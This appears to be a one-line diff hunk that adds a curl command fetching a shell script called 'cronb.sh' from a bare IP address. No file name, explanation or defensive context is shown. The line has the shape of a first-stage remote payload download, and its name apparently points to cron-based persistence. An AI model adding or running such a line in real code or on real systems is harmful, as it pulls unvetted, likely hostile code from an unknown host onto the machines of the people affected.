@@ -1,0 +1,1 @@
+curl -fsSL http://185.161.70.67/b2f628/cronb.sh
